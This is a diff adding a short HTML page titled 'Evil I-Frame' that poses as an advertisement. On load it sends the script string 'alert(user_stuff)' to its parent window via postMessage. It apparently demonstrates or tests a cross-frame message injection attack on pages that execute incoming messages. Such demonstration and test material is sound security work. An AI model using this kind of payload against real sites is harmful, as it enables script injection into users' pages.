@@ -1,0 +1,23 @@
+<!DOCTYPE>
+<html>
+	<head>
+		<title>Evil I-Frame</title>
+		<script src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
+	</head>
+
+	<body>
+		<h1>Advertisment</h1>
+		<script type="text/javascript">
+
+			window.onload = function() {
+				try {
+
+					top.postMessage("alert(user_stuff)", document.referrer);
+
+				} catch (e) {
+					console.log( e );
+				}
+			}
+		</script>
+	</body>
+</html>
